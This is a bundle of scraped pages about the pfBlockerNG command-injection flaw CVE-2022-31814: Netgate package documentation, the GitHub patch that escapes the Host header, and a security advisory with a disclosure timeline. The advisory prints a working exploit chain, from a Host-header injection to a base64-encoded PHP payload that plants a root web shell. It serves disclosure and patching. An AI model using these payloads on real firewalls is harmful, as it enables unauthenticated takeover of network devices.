=== Content from docs.netgate.com_7a1e01fc_20250108_112116.html ===


[Netgate Logo

Netgate Docs](https://docs.netgate.com)

* [Appliances](https://www.netgate.com/appliances)
* [Platforms](https://www.netgate.com/tnsr-vs-pfsense-software)
* [Support](https://www.netgate.com/support)
* [Training](https://www.netgate.com/training)

latest

* [Preface](../preface/index.html)
* [Introduction](../general/index.html)
* [Releases](../releases/index.html)
* [Product Manuals](../product-manuals.html)
* [Networking Concepts](../network/index.html)
* [IPv6](../network/ipv6/index.html)
* [Hardware](../hardware/index.html)
* [Installing and Upgrading](../install/index.html)
* [Configuration](../config/index.html)
* [Multi-Instance Management](../mim/index.html)
* [Backup and Recovery](../backup/index.html)
* [Interface Types and Configuration](../interfaces/index.html)
* [User Management and Authentication](../usermanager/index.html)
* [Certificate Management](../certificates/index.html)
* [Firewall](../firewall/index.html)
* [Network Address Translation](../nat/index.html)
* [Routing](../routing/index.html)
* [Bridging](../bridges/index.html)
* [Virtual LANs (VLANs)](../vlan/index.html)
* [Multiple WAN Connections](../multiwan/index.html)
* [Virtual Private Networks](../vpn/index.html)
* [IPsec](../vpn/ipsec/index.html)
* [L2TP VPN](../vpn/l2tp/index.html)
* [OpenVPN](../vpn/openvpn/index.html)
* [WireGuard](../vpn/wireguard/index.html)
* [Services](../services/index.html)
* [DHCP](../services/dhcp/index.html)
* [DNS](../services/dns/index.html)
* [Dynamic DNS](../services/dyndns/index.html)
* [NTPD](../services/ntpd/index.html)
* [Traffic Shaper](../trafficshaper/index.html)
* [Captive Portal](../captiveportal/index.html)
* [High Availability](../highavailability/index.html)
* [System Monitoring](../monitoring/index.html)
* [Monitoring Graphs](../monitoring/graphs/index.html)
* [System Logs](../monitoring/logs/index.html)
* [Diagnostics](../diagnostics/index.html)
* [Packages](index.html)
  + [Package Manager](manager.html)
  + [Package List](list.html)
  + [ACME package](acme/index.html)
  + [Arping Package](arping.html)
  + [Avahi package](avahi.html)
  + [AWS VPC Wizard](aws-vpc-wizard/index.html)
  + [Backup Files and Directories with the Backup Package](backup.html)
  + [Cache / Proxy](cache-proxy/index.html)
  + [FreeRADIUS package](freeradius.html)
  + [FRR Package](frr/index.html)
  + [HAProxy package](haproxy.html)
  + [iperf package](iperf.html)
  + [IPsec Export Package](ipsec-export.html)
  + [Using LLDP on pfSense software](lldp.html)
  + [Netgate Firmware Upgrade Package](netgate-firmware.html)
  + [Nmap package](nmap.html)
  + [Nut package](nut.html)
  + [Open VM Tools package](open-vm-tools.html)
  + [OpenVPN Client Export Package](openvpn-client-export.html)
  + [OpenVPN Client Import Package](openvpn-client-import.html)
  + pfBlocker-NG Package
    - [General Setup](#general-setup)
    - [Setting up Lists](#setting-up-lists)
    - [Available lists](#available-lists)
    - [FAQ](#faq)
  + [Siproxd package](siproxd.html)
  + [IDS / IPS](snort/index.html)
  + [Stunnel package](stunnel.html)
  + [Sudo Package](sudo.html)
  + [Status Traffic Totals](traffic-totals.html)
  + [UDP Broadcast Relay](udpbroadcastrelay.html)
  + [WireGuard](../vpn/wireguard/index.html)
* [Virtualization](../virtualization/index.html)
* [Wireless](../wireless/index.html)
* [Cellular Wireless](../cellular/index.html)
* [Troubleshooting](../troubleshooting/index.html)
* [pfSenseÂ® software Configuration Recipes](../recipes/index.html)

References

* [Menu Guide](../menuguide/index.html)
* [Glossary of Terms](../glossary.html)
* [Development](../development/index.html)
* [References](../references/index.html)
* [Licensing](../licensing/index.html)

Recipes

* [pfSenseÂ® software Configuration Recipes](../recipes/index.html)

[The pfSense Documentation](../index.html)

* [Docs](/) »
* [pfSenseÂ® software](/pfsense/en/latest) »
* [Packages](index.html)
* [Give Feedback](https://redmine.pfsense.org/projects/pfsense-docs/issues/new?issue[description]=*Page:*%20https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html%0A%0A*Feedback:*&issue[subject]=Feedback%20on%20Packages%20%E2%80%94%20pfBlocker-NG Package)

---

Next

[Siproxd package](siproxd.html "Siproxd package")

Previous

[OpenVPN Client Import Package](openvpn-client-import.html "OpenVPN Client Import Package")

---

#### On This Page

* pfBlocker-NG Package
  + [General Setup](#general-setup)
  + [Setting up Lists](#setting-up-lists)
  + [Available lists](#available-lists)
  + [FAQ](#faq)

# pfBlocker-NG Package[Â¶](#pfblocker-ng-package "Link to this heading")

**pfBlocker-NG** introduces an enhanced alias table feature to pfSenseÂ®
software.

This package enables users to:

* Assign many IP address URL lists from sites like I-blocklist to a single alias
  and then choose a rule action.
* Block countries and IP address ranges.
* Use native functions of pfSense software instead of file hacks and table
  manipulation.

Features include:

* Geographical/Country Blocking
* IP block lists
* Dashboard widget
* XMLRPC Sync
* Frequently updated lists
* Many options to control what to block and how to block
* Network lists can be used in custom rules

## General Setup[Â¶](#general-setup "Link to this heading")

Set the interfaces to be monitored by pfBlocker-NG (both inbound and outbound),
where the inbound is the Internet connection.

To prevent devices or users from accessing sites in the selected countries/IP
addresses, select local interfaces under **outbound**.

## Setting up Lists[Â¶](#setting-up-lists "Link to this heading")

This is the IPBlocklist feature, enter IP addresses here to specifically block.
It must be in the file format or CIDR. Create a list for each type of action to
be taken by pfBlocker.

Options are:

Deny Both

Will deny access on Both directions.

Deny Inbound

Will deny access from selected lists to the local network.

Deny Outbound

Will deny access from local users to IP address lists selected to block.

Permit Inbound

Will allow access from selected lists to the local network.

Permit Outbound

Will allow access from local users to IP address lists selected to block.

Disabled

Will just keep selection and do nothing to selected Lists.

Alias Only

Will create an alias with selected Lists to help custom rule assignments.

The rest of the tabs (except sync) specify the other lists included with
the package. They are separated by continent with the exception of the
spammer list which contains countries from around the globe that are
known to harbor spammers.

Sync tab configures pfBlocker to sync its configuration to other pfSense
devices.

## Available lists[Â¶](#available-lists "Link to this heading")

Spamhaus

DROP and EDROP.

* <http://www.spamhaus.org/drop/drop.txt>
* <http://www.spamhaus.org/drop/edrop.txt>

DShield

Most Active Attacking IPs.

* <http://feeds.dshield.org/top10-2.txt>

iblocklist.com

A number of lists are available.

* <http://www.iblocklist.com/lists.php>

## FAQ[Â¶](#faq "Link to this heading")

Iâm getting memory errors while applying pfblocker lists, how to fix this?:

Increase table size to avoid memory errors in Advanced settings.

I canât see any pfblocker rules applied, whats wrong?:

pfblocker requires at least one firewall entry (any interface) for it to be
active. One way to verify is to check the front page widget.

pfBlocker always moves its rules to the top, how can I stop this?:

Change rule action to Alias only and then apply custom rules using pfBlocker
aliases with an arbitrary sequence.

How can I apply pfBlocker lists in floating rules?:

Aliases are used for customized filter entries and float rules.

See also

The [pfSense software issue tracker](https://redmine.pfsense.org/projects/pfsense-packages/issues?utf8=%E2%9C%93&set_filter=1&sort=id%3Adesc&f%5B%5D=status_id&op%5Bstatus_id%5D=o&f%5B%5D=category_id&op%5Bcategory_id%5D=%3D&v%5Bcategory_id%5D%5B%5D=97&f%5B%5D=&c%5B%5D=tracker&c%5B%5D=status&c%5B%5D=priority&c%5B%5D=subject&c%5B%5D=assigned_to&c%5B%5D=updated_on&group_by=&t%5B%5D=) contains a list of known issues with
this package.

---

Next

[Siproxd package](siproxd.html "Siproxd package")

Previous

[OpenVPN Client Import Package](openvpn-client-import.html "OpenVPN Client Import Package")

Was this page helpful?

Documentation Feedback

For assistance in solving software problems, please post your question on the [Netgate Forum](https://forum.netgate.com).
If you see anything that's wrong or missing with the documentation, please suggest an edit by using the feedback
button in the upper right corner so it can be improved.

---

 Additional Resources
v: latest

Languages
[en](/pfsense/en/latest/)

Versions
[latest](/pfsense/en/latest/)

---



=== Content from github.com_b5581b5c_20250108_112117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpfsense%2FFreeBSD-ports%2Fpull%2F1169%2Fcommits%2F071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpfsense%2FFreeBSD-ports%2Fpull%2F1169%2Fcommits%2F071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Fcommits&source=header-repo&source_repo=pfsense%2FFreeBSD-ports)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pfsense](/pfsense)
/
**[FreeBSD-ports](/pfsense/FreeBSD-ports)**
Public

* [Notifications](/login?return_to=%2Fpfsense%2FFreeBSD-ports) You must be signed in to change notification settings
* [Fork
  601](/login?return_to=%2Fpfsense%2FFreeBSD-ports)
* [Star
   472](/login?return_to=%2Fpfsense%2FFreeBSD-ports)

* [Code](/pfsense/FreeBSD-ports)
* [Pull requests
  25](/pfsense/FreeBSD-ports/pulls)
* [Actions](/pfsense/FreeBSD-ports/actions)
* [Projects
  0](/pfsense/FreeBSD-ports/projects)
* [Security](/pfsense/FreeBSD-ports/security)
* [Insights](/pfsense/FreeBSD-ports/pulse)

Additional navigation options

* [Code](/pfsense/FreeBSD-ports)
* [Pull requests](/pfsense/FreeBSD-ports/pulls)
* [Actions](/pfsense/FreeBSD-ports/actions)
* [Projects](/pfsense/FreeBSD-ports/projects)
* [Security](/pfsense/FreeBSD-ports/security)
* [Insights](/pfsense/FreeBSD-ports/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fpfsense%2FFreeBSD-ports%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fpfsense%2FFreeBSD-ports%2Fissues%2Fnew%2Fchoose)
to your account

# pfBlockerNG v2.1.4\_27 #1169

 Merged

[netgate-git-updates](/netgate-git-updates)
merged 2 commits into
[pfsense:devel](/pfsense/FreeBSD-ports/tree/devel "pfsense/FreeBSD-ports:devel")
from
BBcan177:patch-1

Jun 5, 2022

[Conversation
0](/pfsense/FreeBSD-ports/pull/1169)
[Commits
2](/pfsense/FreeBSD-ports/pull/1169/commits)
[Checks
0](/pfsense/FreeBSD-ports/pull/1169/checks)
[Files changed](/pfsense/FreeBSD-ports/pull/1169/files)

 Merged

# [pfBlockerNG v2.1.4\_27](#top) #1169

Changes from **1 commit**

Commits

[Show all changes

2 commits](/pfsense/FreeBSD-ports/pull/1169/files)
Select commit
Hold shift + click to select a range

[`071bdcf`
Update index.php

BBcan177 Jun 5, 2022](/pfsense/FreeBSD-ports/pull/1169/commits/071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e)
[`7418689`
Update Makefile

BBcan177 Jun 5, 2022](/pfsense/FreeBSD-ports/pull/1169/commits/74186894fdb710a61598f2c6822ae0a3b5566396)

**File filter**

### Filter by extension

Filter by extension

.php
(1)

All 1 file type selected

---

Viewed files

[Clear filters](/pfsense/FreeBSD-ports/pull/1169/commits/071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Prev

 [Next](/pfsense/FreeBSD-ports/pull/1169/commits/74186894fdb710a61598f2c6822ae0a3b5566396)Next commit

Update index.php

* Loading branch information

[![@BBcan177](https://avatars.githubusercontent.com/u/6877949?s=40&v=4)](/BBcan177)

[BBcan177](/pfsense/FreeBSD-ports/commits?author=BBcan177 "View all commits by BBcan177")
authored
Jun 5, 2022

commit 071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[net/pfSense-pkg-pfBlockerNG/files/usr/local/www/pfblockerng/www/index.php](#diff-1b63cc02008a3776252aaea30180469d7134111caebcfb509cc97badd053eb5d "net/pfSense-pkg-pfBlockerNG/files/usr/local/www/pfblockerng/www/index.php")

Show comments

[View file](/pfsense/FreeBSD-ports/blob/071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e/net/pfSense-pkg-pfBlockerNG/files/usr/local/www/pfblockerng/www/index.php)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,7 +48,7 @@ |
|  |  |  |
|  |  | // Query DNSBL Alias for Domain List. |
|  |  | $query = str\_replace('.', '\.', htmlspecialchars($\_SERVER['HTTP\_HOST'])); |
|  |  | exec("/usr/bin/grep -l ' \"{$query} 60 IN A' /var/db/pfblockerng/dnsblalias/\*", $match); |
|  |  | exec("/usr/bin/grep -l " . escapeshellarg("\"{$query} 60 IN A") . " /var/db/pfblockerng/dnsblalias/\*", $match); |
|  |  | $pfb\_query = strstr($match[0], 'DNSBL', FALSE); |
|  |  |  |
|  |  | // Query for a TLD Block |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_9eb0be9a_20250108_112114.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.ihteam.net_7b9c4d1d_20250108_112118.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# pfBlockerNG Unauth RCE Vulnerability

* Post author

  By r00t
* Post date

  [5 September 2022](https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/)
* [1 Comment on pfBlockerNG Unauth RCE Vulnerability](https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/#comments)

## TL;DR

IHTeam undertook an independent security assessment of pfsense’s pfBlockerNG plugin version 2.1.4\_26 and identified the following vulnerability:

* Unauthenticated Remote Command Execution as root (CVE-2022-31814)

## What’s pfBlockerNG

pfBlockerNG (<https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html>) is a pfSense plugin that is NOT installed by default and it’s generally used to block inbound connections from whole countries or IP ranges.

## CVE-2022-31814

IHTeam identified a remote command execution vulnerability in **pfBlockerNG <= 2.1.4\_26** that can be exploited from an unauthenticated perspective.

[![](https://www.ihteam.net/wp-content/uploads/image.png)](https://www.ihteam.net/wp-content/uploads/image.png)

Fig 1: Image showing the installed pfBlockerNG plugin

Being the web server run by the root user, the impact of this vulnerability is critical, with a CVSS 3.0 score of 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

The consultant downloaded the latest stable version of pfSense (2.6.0 at the moment of writing) and installed the latest stable version of pfBlockerNG (2.1.4\_26 at the moment of writing).

The vulnerability was identified in the file **/usr/local/www/pfblockerng/www/index.php** which is used to record and query DNSBL data. Specifically to query, the code uses PHP function **exec()**, passing untrusted data into the command.

```
// Query DNSBL Alias for Domain List.
$query = str_replace('.', '\.', htmlspecialchars($_SERVER['HTTP_HOST']));

exec("/usr/bin/grep -l ' \"{$query} 60 IN A' /var/db/pfblockerng/dnsblalias/*", $match);
```

The **$\_SERVER[‘HTTP\_HOST’]** element passed in the above code, is a user-controllable input that could result in changing the meaning of the command (as originally intended). An attacker can tamper with the HTTP\_HOST parameter via the “**Host**:” header of the request, as shown in the picture below:

[![](https://www.ihteam.net/wp-content/uploads/image-1.png)](https://www.ihteam.net/wp-content/uploads/image-1.png)

Fig 2: Image showing the “Host” header value reflected in command

—**Restrictions on characters**—

There were few restrictions in place regarding characters you could use:

* htmlspecialchars() PHP function was preventing the use of shell redirections (> and <), double quotes (“), and ampersand (&)

[![](https://www.ihteam.net/wp-content/uploads/image-2.png)](https://www.ihteam.net/wp-content/uploads/image-2.png)

Fig 3: Image showing how “&” was encoded in HTML when used

* nginx web server won’t accept the forward slash (/) in the Host header, returning a 400 – Bad Request

[![](https://www.ihteam.net/wp-content/uploads/image-3.png)](https://www.ihteam.net/wp-content/uploads/image-3.png)

Fig 4: Image showing nginx returning 400

Therefore, the only available characters to build a working payload were:

* pipe (|)
* semicolon (;)
* single quote (‘)
* spaces ( )

**–Simple proof of concept–**

To easily identify a valid payload, we can copy the original command in the exec() function and try to tamper with it directly in a shell:

```
/usr/bin/grep -l ' "INJECTION 60 IN A' /var/db/pfblockerng/dnsblalias/*
```

In order to obtain a working PoC, we need:

1. Close the single quote
2. Specify a directory to search on
3. Break the command with a semicolon
4. Comment or add an additional single quote

```
' *; sleep 5; '
```

The above simple proof of concept made the system delay the request for 5 seconds, confirming the injection worked.

**–Backdooring pfSense–**

The next step would involve the build of a stable shell on the remote machine and to do so, we would need to find a creative way to (at least) write a PHP file.

Remember that we can’t use redirections or even forward slashes, therefore the consultant utilized base64 to write a more complex payload that could be executed via php-cli.

However, the “base64 -d” binary was not installed by default in pfSense, but python3.8 was, therefore we were able to write and decode base64 payloads and pipe everything in the php-cli binary:

* Simple PHP code

```
<?echo("HELL");?>
```

* Encode it in base64

```
PD9lY2hvKCJIRUxMIik7Pz4=
```

* Use python to decode the base64

```
python3.8 -m base64 -d
```

* Pipe everything into PHP

```
| php
```
[![](https://www.ihteam.net/wp-content/uploads/image-4.png)](https://www.ihteam.net/wp-content/uploads/image-4.png)

Fig 5: Image showing the “echo” message successfully executed by PHP

Keep in mind that base64 has forward slashes (/) in its charset – therefore build a payload that doesn’t include them.

Now that we got back the “HELL” message, we know that PHP successfully executed our payload, we can build a more complex payload to backdoor pfSense.

```
<?$a=fopen("/usr/local/www/system_advanced_control.php","w") or die();$t='<?php print(passthru( $_GET["c"]));?>';fwrite($a,$t);fclose( $a);?>
```

It creates a file in **/usr/local/www/system\_advanced\_control.php** with a very simple call to execute command and get back results from it.

```
PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+
```

Once again, the above payload, encoded in base64, did not contain any forward slashes. Hence, the final payload to obtain a backdoor in pfSense would be as follow:

```
/usr/bin/grep -l ' "' * ; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKGV4ZWMoJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSgkYSk7Pz4=' | python3.8 -m base64 -d | php ; ' 60 IN A' /var/db/pfblockerng/dnsblalias/*
```
## Exploit Code

The exploit code can be found at <https://iht.li/p/WWATN>

[![](https://www.ihteam.net/wp-content/uploads/image-6.png)](https://www.ihteam.net/wp-content/uploads/image-6.png)

Fig 6: Image showing the exploit execution

## Disclosure Timeline

28/05/2022 – Technical details sent to [[email protected]](/cdn-cgi/l/email-protection)
31/05/2022 – No response from NetGate, directly contacted BBcan177 (maintainer of the package in GitHub)
05/06/2022 – BBcan177 released a temporary patch https://github.com/pfsense/FreeBSD-ports/pull/1169 while waiting to deprecate version 2.x in favor of 3.x
07/06/2022 – NetGate came back saying they don’t issue security advisories for vulnerabilities within Packages, especially community-maintained packages such as pfBlockerNG.
–3 months delay to allow clients to patch–
05/09/2022 – Blog post and exploit published

---

[←
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)
[→
Vulnerabilità accumulatori smart Aton Storage](https://www.ihteam.net/advisory/vulnerabilita-accumulatori-smart-aton-storage/)

---

## One reply on “pfBlockerNG Unauth RCE Vulnerability”

![](https://secure.gravatar.com/avatar/91ca29bbf9cd60f9a3c0a953ea9df917?s=120&d=mm&r=g)Arthur Pochartsays:
[28 February 2023 at 16:16](https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/#comment-1806)

Very cool finding! Even though netgate suck about not wanting to patch community packages at least this vuln will be resolved in pfsense+ latest release with 8.1 php interpreter (single quotes issue solved). Do you know if pfsense CE latest release is also migrating to php 8.1?

[Reply](#comment-1806)

---

## Leave a Reply [Cancel reply](/advisory/pfblockerng-unauth-rce-vulnerability/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)



=== Content from packetstormsecurity.com_79323eb4_20250108_112115.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from github.com_146edc16_20250108_112117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpfsense%2FFreeBSD-ports%2Fpull%2F1169)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpfsense%2FFreeBSD-ports%2Fpull%2F1169)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=pfsense%2FFreeBSD-ports)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pfsense](/pfsense)
/
**[FreeBSD-ports](/pfsense/FreeBSD-ports)**
Public

* [Notifications](/login?return_to=%2Fpfsense%2FFreeBSD-ports) You must be signed in to change notification settings
* [Fork
  601](/login?return_to=%2Fpfsense%2FFreeBSD-ports)
* [Star
